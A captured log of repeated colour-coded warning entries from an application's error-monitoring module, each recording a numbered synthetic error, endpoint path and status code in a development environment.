WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799423Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2098'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799474Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2099'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799524Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2100'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799576Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2101'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799626Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2102'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799677Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2103'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799727Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2104'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799775Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2105'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799824Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2106'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799873Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2107'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799921Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2108'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799970Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2109'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800019Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2110'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800068Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2111'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800116Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2112'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800165Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2113'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800214Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2114'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800263Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2115'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800311Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2116'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800359Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2117'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800407Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2118'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800455Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2119'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800503Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2120'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800550Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2121'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800597Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2122'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800645Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2123'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800692Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2124'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800782Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2125'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800858Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2126'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800913Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2127'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.800965Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2128'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801014Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2129'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801064Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2130'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801114Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2131'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2132'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801211Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2133'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801259Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2134'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801306Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2135'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801354Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2136'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.801402Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m43[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2137'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
